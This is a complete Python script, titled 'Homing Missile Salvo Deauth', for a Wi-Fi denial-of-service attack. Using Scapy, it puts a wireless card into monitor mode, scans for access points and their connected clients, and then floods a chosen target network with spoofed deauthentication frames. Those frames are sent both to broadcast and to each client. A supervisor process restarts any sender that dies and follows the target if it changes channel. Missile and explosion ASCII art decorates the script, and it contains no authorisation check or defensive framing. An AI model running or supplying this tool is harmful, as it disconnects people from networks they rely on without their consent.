#!/usr/bin/env python3
import os
import re
import sys
import time
import logging
import subprocess
import multiprocessing
import random
import signal
import threading  # <-- We'll use threading instead of multiprocessing for ASCII
from typing import Dict, List, Tuple, Optional

from scapy.all import (
    sniff,
    sendp,
    RadioTap,
    Dot11,
    Dot11Beacon,
    Dot11ProbeResp,
    Dot11Elt,
    Dot11Deauth,
    conf
)
conf.verb = 0  # Suppress Scapy's verbose output

# pip install pyfiglet
from pyfiglet import Figlet

def minimal_init_logging():
    logging.basicConfig(
        level=logging.WARNING,
        format="%(asctime)s [%(levelname)s] %(message)s"
    )

minimal_init_logging()

# ------------------------------------------------------------------------------
# 1) A Pyfiglet Banner (One-Off, No Delay)
# ------------------------------------------------------------------------------
def show_pyfiglet_banner():
    f = Figlet(font='slant')
    print(f.renderText("Homing Missile Salvo Deauth"))

# ------------------------------------------------------------------------------
# 2) Background Radar Animation (Threaded, No Main-Thread Delay)
# ------------------------------------------------------------------------------
def animation_radar_thread(stop_event):
    frames = [

        r"""
[Radar] Scanning... [=       ]

   ┌───────────────┐
   │       .       │
   │       .       │
   │       .       │
   │       .       │
   │               │
   │               │
   │               │
   └───────────────┘
""",
        r"""
[Radar] Scanning... [==      ]

   ┌───────────────┐
   │             . │
   │           .   │
   │         .     │
   │       .       │
   │               │
   │               │
   │               │
   └───────────────┘
""",
        r"""
[Radar] Scanning... [===     ]

   ┌───────────────┐
   │               │
   │               │
   │               │
   │       ........│
   │               │
   │               │
   │               │
   └───────────────┘
""",
        r"""
[Radar] Scanning... [====    ]

   ┌───────────────┐
   │               │
   │               │
   │               │
   │       .       │
   │         .     │
   │           .   │
   │             . │
   └───────────────┘
""",
        r"""
[Radar] Scanning... [=====   ]

   ┌───────────────┐
   │               │
   │               │
   │               │
   │       .       │
   │       .       │
   │       .       │
   │       .       │
   └───────────────┘
""",
        r"""
[Radar] Scanning... [======  ]

   ┌───────────────┐
   │               │
   │               │
   │               │
   │       .       │
   │     .         │
   │   .           │
   │ .             │
   └───────────────┘
""",
        r"""
[Radar] Scanning... [======= ]

   ┌───────────────┐
   │               │
   │               │
   │               │
   │........       │
   │               │
   │               │
   │               │
   └───────────────┘
"""
,
        r"""
[Radar] Scanning... [========]

   ┌───────────────┐
   │ .             │
   │   .           │
   │     .         │
   │       .       │
   │               │
   │               │
   │               │
   └───────────────┘
"""
         ]
    idx = 0
    while not stop_event.is_set():
        sys.stdout.write("\033[2J\033[H")  # ANSI: Clear screen + move cursor to top-left
        print(frames[idx])
        sys.stdout.flush()
        time.sleep(0.2)
        idx = (idx + 1) % len(frames)

    sys.stdout.write("\033[2J\033[H")  # Clear one last time when done
    sys.stdout.flush()
# ------------------------------------------------------------------------------
# 3) Optional ASCII “Missile Launch” & “Explosion” (One-Off Prints)
# ------------------------------------------------------------------------------
def show_missile_launch():
    f = Figlet(font='slant')
    print(f.renderText("\nLAUNCHING MISSILES"))



    art = r"""

            /\
           /  \
           |  |
          /----\
          [XXXX]
          [XXXX]
          |    |
          |    |
          |    |
          |    |
         /|    |\
        /_|____|_\
         ........
        ..........
       ............
                         /\
                        /  \
                        |  |
                       /----\
                       [XXXX]
                       [XXXX]
                       |    |
                       |    |
                       |    |
                       |    |
                      /|    |\
                     /_|____|_\
                      ........
                     ..........
                    ............
                                       /\
                                      /  \
                                      |  |
                                     /----\
                                     [XXXX]
                                     [XXXX]
                                     |    |
                                     |    |
                                     |    |
                                     |    |
                                    /|    |\
                                   /_|____|_\
                                    ........
                                   ..........
                                  ............

    """
    print(art)

def show_explosion():
    art = r"""

    . . .                  . . .                  . . .
    ( ! )                  ( ! )                  ( ! )
  .  ' '  .              .  ' '  .              .  ' '  .
 '  Boom!  '            '  Boom!  '            '  Boom!  '
  .  ' '  .              .  ' '  .              .  ' '  .
    ( ! )                  ( ! )                  ( ! )
    . . .                  . . .                  . . .


    """
    print(art)
    print("\n")


# ------------------------------------------------------------------------------
# AP Encryption Detection (Same as before)
# ------------------------------------------------------------------------------
def detect_encryption(pkt) -> str:
    if not pkt.haslayer(Dot11Beacon) and not pkt.haslayer(Dot11ProbeResp):
        return "Unknown"
    bcn = pkt[Dot11Beacon] if pkt.haslayer(Dot11Beacon) else pkt[Dot11ProbeResp]
    cap = bcn.cap if bcn else 0
    privacy = bool(cap & 0x0010)
    if privacy:
        rsn = pkt.getlayer(Dot11Elt, ID=48)
        if rsn is not None:
            return "WPA2"
        wpa = pkt.getlayer(Dot11Elt, ID=221)
        if wpa and b"\x00\x50\xF2\x01\x01\x00" in bytes(wpa):
            return "WPA"
        return "WEP"
    else:
        return "Open"


# ------------------------------------------------------------------------------
# Basic monitor-mode, scanning, etc. (Unchanged)
# ------------------------------------------------------------------------------
import logging

def force_monitor_mode(iface: str) -> bool:
    os.system("systemctl stop NetworkManager")
    os.system("airmon-ng check kill")
    cmds = [
        f"ip link set {iface} down",
        f"iw dev {iface} set monitor control",
        f"ip link set {iface} up"
    ]
    for c in cmds:
        rc = os.system(c)
        if rc != 0:
            logging.warning(f"[force_monitor_mode] Command failed: {c} => code={rc}")
            os.system(f"ip link set {iface} up")  # revert
            return False
    mm_enabled = (os.system(f"iw dev {iface} info | grep 'type monitor' > /dev/null 2>&1") == 0)
    if not mm_enabled:
        logging.warning(f"[force_monitor_mode] {iface} is not in monitor mode!")
    return mm_enabled


def run_cmd(cmd: str) -> str:
    try:
        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                text=True, shell=True)
        stdout = result.stdout.strip()
        stderr = result.stderr.strip()
        if stderr:
            logging.warning(f"[run_cmd] Error for '{cmd}': {stderr}")
        return stdout
    except Exception as e:
        logging.warning(f"[run_cmd] Command failed: {cmd}, Error: {e}")
        return ""


def list_interfaces() -> list:
    output = run_cmd("iw dev")
    return re.findall(r'Interface\s+(\S+)', output)


def cleanup_interfaces():
    print("[*] Cleaning up leftover monitor interfaces...")
    for iface in list_interfaces():
        if iface.startswith("mon"):
            run_cmd(f"ip link set {iface} down")
            run_cmd(f"iw dev {iface} del")


def set_channel(interface: str, channel: int):
    run_cmd(f"iw dev {interface} set channel {channel}")
    time.sleep(0.1)


def get_2ghz_channels(interface: str) -> list:
    out = run_cmd("iw phy")
    found = []
    for line in out.splitlines():
        line = line.strip()
        m = re.search(r"(\d+)\s+MHz\s+\[(\d+)\]", line)
        if m:
            freq_mhz = int(m.group(1))
            channel = int(m.group(2))
            if 1 <= channel <= 14:
                found.append(channel)
    return sorted(set(found))


def get_5ghz_channels(interface: str) -> list:
    out = run_cmd("iw phy")
    found = []
    for line in out.splitlines():
        line = line.strip()
        m = re.search(r"(\d+)\s+MHz\s+\[(\d+)\]", line)
        if m:
            freq_mhz = int(m.group(1))
            channel = int(m.group(2))
            if channel > 14:
                found.append(channel)
    return sorted(set(found))


def ap_sniff_callback(pkt, ap_dict):
    if (pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp)) and pkt.haslayer(Dot11Elt):
        bssid = pkt[Dot11].addr3
        if not bssid:
            return
        bssid = bssid.lower()
        ds = pkt.getlayer(Dot11Elt, ID=3)
        if ds and ds.info and len(ds.info) == 1:
            ch = ds.info[0]
        else:
            return
        essid_elt = pkt.getlayer(Dot11Elt, ID=0)
        if essid_elt and essid_elt.info:
            essid = essid_elt.info.decode(errors="ignore")
        else:
            essid = "<Hidden>"
        rssi_val = getattr(pkt, 'dBm_AntSignal', None)
        enc_type = detect_encryption(pkt)
        if bssid not in ap_dict:
            ap_dict[bssid] = {
                "ch": ch,
                "essid": essid,
                "signals": [],
                "encryption": enc_type
            }
        ap_dict[bssid]["ch"] = ch
        ap_dict[bssid]["essid"] = essid
        ap_dict[bssid]["encryption"] = enc_type
        if rssi_val is not None:
            ap_dict[bssid]["signals"].append(rssi_val)


def client_sniff_callback(pkt, bssid: str, client_set: set):
    if pkt.haslayer(Dot11):
        if pkt.addr3 and pkt.addr3.lower() == bssid.lower():
            if pkt.addr1 and pkt.addr1.lower() != bssid.lower():
                client_set.add(pkt.addr1.lower())
            if pkt.addr2 and pkt.addr2.lower() != bssid.lower():
                client_set.add(pkt.addr2.lower())


def quick_sniff_bssid(iface: str, channel: int, target_bssid: str, sniff_time=0.2) -> bool:
    set_channel(iface, channel)
    found = {}
    def cb(pkt):
        if (pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp)) and pkt.haslayer(Dot11Elt):
            b = pkt[Dot11].addr3
            if b and b.lower() == target_bssid.lower():
                found[b.lower()] = True
    sniff(iface=iface, prn=cb, timeout=sniff_time, store=False)
    return (target_bssid.lower() in found)


def scan_for_bssids(iface: str, channels: list, dwell=1) -> dict:
    discovered = {}
    for ch in channels:
        set_channel(iface, ch)
        sniff(iface=iface,
              prn=lambda p: ap_sniff_callback(p, discovered),
              timeout=dwell, store=False)
    return discovered


def scan_for_clients(iface: str, bssid: str, channel: int, sniff_time=2) -> list:
    set_channel(iface, channel)
    s = set()
    sniff(iface=iface,
          prn=lambda p: client_sniff_callback(p, bssid, s),
          timeout=sniff_time, store=False)
    return list(s)


# Deauth logic (unchanged)
def continuous_broadcast_deauth(iface: str, bssid: str):
    print(f"[BcastProc] {iface} -> {bssid} started.")
    pkt_bcast = (
        RadioTap() /
        Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid) /
        Dot11Deauth(reason=7)
    )
    try:
        while True:
            sendp(pkt_bcast, iface=iface, count=1, inter=0, verbose=False)
            time.sleep(random.uniform(0, 0.1))
    except KeyboardInterrupt:
        print(f"[BcastProc] {iface} broadcast interrupted.")
    except Exception as e:
        print(f"[BcastProc] {iface} broadcast error: {e}")


def continuous_client_deauth(iface: str, bssid: str, client_mac: str):
    print(f"[ClientProc] {iface} -> {client_mac} started.")
    pkt_ap2client = (
        RadioTap() /
        Dot11(addr1=client_mac, addr2=bssid, addr3=bssid) /
        Dot11Deauth(reason=7)
    )
    pkt_client2ap = (
        RadioTap() /
        Dot11(addr1=bssid, addr2=client_mac, addr3=bssid) /
        Dot11Deauth(reason=7)
    )
    try:
        while True:
            sendp(pkt_ap2client, iface=iface, count=1, inter=0, verbose=False)
            sendp(pkt_client2ap, iface=iface, count=1, inter=0, verbose=False)
            time.sleep(random.uniform(0, 0.1))
    except KeyboardInterrupt:
        print(f"[ClientProc] {iface} -> {client_mac} interrupted.")
    except Exception as e:
        print(f"[ClientProc] {iface} -> {client_mac} error: {e}")


def deauth_manager(iface: str, bssid: str, clients: list, pipe_conn):
    child_procs = {}
    def spawn_bcast_proc():
        p = multiprocessing.Process(
            target=continuous_broadcast_deauth,
            args=(iface, bssid),
            daemon=False
        )
        p.start()
        child_procs["broadcast"] = p

    def spawn_client_proc(mac: str):
        p = multiprocessing.Process(
            target=continuous_client_deauth,
            args=(iface, bssid, mac),
            daemon=False
        )
        p.start()
        child_procs[mac] = p

    spawn_bcast_proc()
    for c in clients:
        spawn_client_proc(c)

    print(f"[Manager] {iface} -> {bssid}: broadcast + {len(clients)} client(s)")

    try:
        while True:
            if pipe_conn.poll():
                msg = pipe_conn.recv()
                if msg == "STOP":
                    print(f"[Manager] {iface} got STOP, terminating.")
                    break
            for key, proc in list(child_procs.items()):
                if not proc.is_alive():
                    print(f"[Manager] {iface} child {key} died, restarting.")
                    if key == "broadcast":
                        spawn_bcast_proc()
                    else:
                        spawn_client_proc(key)
            time.sleep(0.5)
    except KeyboardInterrupt:
        print(f"[Manager] {iface} interrupted by user.")
    except Exception as e:
        print(f"[Manager] {iface} error: {e}")
    finally:
        for p in child_procs.values():
            if p.is_alive():
                p.terminate()
        print(f"[Manager] {iface} exit.")


def supervisor_single_bssid(bssid: str, channel: int, clients: list, iface: str, band: str):
    manager_parent_conn, manager_child_conn = multiprocessing.Pipe()
    set_channel(iface, channel)
    manager_proc = multiprocessing.Process(
        target=deauth_manager,
        args=(iface, bssid, clients, manager_child_conn),
        daemon=False
    )
    manager_proc.start()

    current_ch = channel
    channels_to_check = get_2ghz_channels(iface) if band == "2.4" else get_5ghz_channels(iface)

    try:
        while True:
            time.sleep(5)
            if manager_proc.is_alive():
                manager_parent_conn.send("STOP")
                manager_proc.join(timeout=3)
                if manager_proc.is_alive():
                    manager_proc.terminate()

            found_on_current = quick_sniff_bssid(iface, current_ch, bssid, sniff_time=0.2)
            if found_on_current:
                new_channel = current_ch
                print(f"[Supervisor:{bssid}] Still on ch {current_ch}, refreshing clients.")
                set_channel(iface, current_ch)
                new_clients = scan_for_clients(iface, bssid, current_ch, sniff_time=2)
                clients = new_clients
            else:
                new_channel = -1
                for ch in channels_to_check:
                    if ch == current_ch:
                        continue
                    if quick_sniff_bssid(iface, ch, bssid, sniff_time=0.2):
                        new_channel = ch
                        break
                if new_channel < 0:
                    print(f"[Supervisor:{bssid}] BSSID not found on any channel. Retrying in 1s.")
                    time.sleep(1)
                    continue

                if new_channel != current_ch:
                    print(f"[Supervisor:{bssid}] BSSID moved from {current_ch} to {new_channel}")
                    set_channel(iface, new_channel)
                    new_clients = scan_for_clients(iface, bssid, new_channel, sniff_time=2)
                    print(f"[Supervisor:{bssid}] Found {len(new_clients)} client(s) on new channel.")
                    clients = new_clients
                    current_ch = new_channel

            set_channel(iface, current_ch)
            manager_parent_conn, manager_child_conn = multiprocessing.Pipe()
            manager_proc = multiprocessing.Process(
                target=deauth_manager,
                args=(iface, bssid, clients, manager_child_conn),
                daemon=False
            )
            manager_proc.start()

    except KeyboardInterrupt:
        print(f"[Supervisor:{bssid}] CTRL+C caught. Exiting.")
    except Exception as e:
        print(f"[Supervisor:{bssid}] Error: {e}")
    finally:
        if manager_proc.is_alive():
            manager_parent_conn.send("STOP")
            manager_proc.join(timeout=3)
            if manager_proc.is_alive():
                manager_proc.terminate()
        print(f"[Supervisor:{bssid}] Done.")


# ------------------------------------------------------------------------------
# MAIN
# ------------------------------------------------------------------------------
def main():
    # 1) Show a big Pyfiglet banner (one-off, no delay)
    show_pyfiglet_banner()

    # 2) Start a background thread for “radar” animation
    stop_anim = threading.Event()
    anim_thread = threading.Thread(target=animation_radar_thread, args=(stop_anim,), daemon=True)

    # Meanwhile, proceed with normal logic (no sleeps here)
    cleanup_interfaces()

    ifaces = list_interfaces()
    if not ifaces:
        print("[!] No Wi-Fi interfaces found.")
        # Stop the ASCII animation
        return

    for idx, ifc in enumerate(ifaces):
        print(f"{idx}: {ifc}")

    try:
        chosen = int(input("Select base interface index: ").strip())
        base_iface = ifaces[chosen]
    except:
        print("[!] Invalid selection.")
        # Stop the ASCII animation
        return

    print("\nWhich band do you want to target?")
    print("[1] 2.4 GHz")
    print("[2] 5 GHz")
    band_sel = input("Select: ").strip()
    if band_sel == "1":
        band = "2.4"
    elif band_sel == "2":
        band = "5"
    else:
        print("[!] Invalid band selection.")
        return

    ok = force_monitor_mode(base_iface)
    if not ok:
        print("[!] Could not set monitor mode.")
        return

    # Let’s do a quick channel scan
    if band == "2.4":
        chs_24 = get_2ghz_channels(base_iface)
        print(f"[*] Scanning 2.4 GHz channels: {chs_24}")
        discovered = scan_for_bssids(base_iface, chs_24, dwell=0.2)
        print("Found BSSIDs, Peforming Reconnaissance")
        time.sleep(2)
        anim_thread.start()

    else:
        chs_5 = get_5ghz_channels(base_iface)
        print(f"[*] Scanning 5 GHz channels: {chs_5}")
        discovered = scan_for_bssids(base_iface, chs_5, dwell=0.2)
        print("Found BSSIDs, Peforming Reconnaissance")
        time.sleep(2)
        anim_thread.start()

    for bssid, info in discovered.items():
        ch = info["ch"]
        found_clients = scan_for_clients(base_iface, bssid, ch, sniff_time=2)
        info["client_count"] = len(found_clients)


    all_bssids = sorted(discovered.items(), key=lambda x: x[0])
    stop_anim.set()  # stop the radar
    if not all_bssids:
        stop_anim.set()  # stop the radar
        time.sleep(1)
        print("[!] Found no BSSIDs. Exiting.")
        return
    time.sleep(1)

    print("\nDiscovered Networks (with approx. RSSI & # of clients):")
    for i, (bssid, info) in enumerate(all_bssids):
        ch = info["ch"]
        essid = info["essid"]
        signals = info["signals"]
        enc = info["encryption"]
        if signals:
            avg_rssi = sum(signals) / len(signals)
            rssi_str = f"{avg_rssi:.1f} dBm"
        else:
            rssi_str = "N/A"
        c_count = info.get("client_count", 0)
        print(f"{i}. BSSID={bssid}, ch={ch}, ESSID='{essid}', ENC={enc}, RSSI={rssi_str}, Clients={c_count}")

    single_pick = input("\nEnter the index of the target BSSID, or empty to skip: ").strip()
    if not single_pick:
        print("[!] No BSSID chosen. Exiting.")
        return

    try:
        i = int(single_pick)
        if 0 <= i < len(all_bssids):
            bssid, info = all_bssids[i]
            ch = info["ch"]
            essid = info["essid"]
        else:
            print("[!] Invalid index. Exiting.")
            return
    except:
        print("[!] Invalid input. Exiting.")
        return

    print(f"[+] Selected BSSID: {bssid} on channel {ch}")
    f = Figlet(font='slant')
    print(f.renderText("\nTARGET AQUIRED :"))
    print(f.renderText("\n"+essid))
    time.sleep(3)

    # Show missile launch (one-off)
    show_missile_launch()
    time.sleep(3)
    clients = scan_for_clients(base_iface, bssid, ch, sniff_time=2)
    print(f"[+] {bssid} (ch={ch}) => found {len(clients)} client(s): {clients}")

    # Start supervisor
    supervisor_proc = multiprocessing.Process(
        target=supervisor_single_bssid,
        args=(bssid, ch, clients, base_iface, band),
        daemon=False
    )
    supervisor_proc.start()

    print("\n[!] Supervisor launched. Press Ctrl+C to stop.\n")

    try:
        while supervisor_proc.is_alive():
            time.sleep(3)
    except KeyboardInterrupt:
        print("[Main] Caught Ctrl+C. Killing supervisor.")
    finally:
        if supervisor_proc.is_alive():
            supervisor_proc.terminate()
        show_explosion()

        cleanup_interfaces()
        print("[Main] Exiting.")


if __name__ == "__main__":
    main()
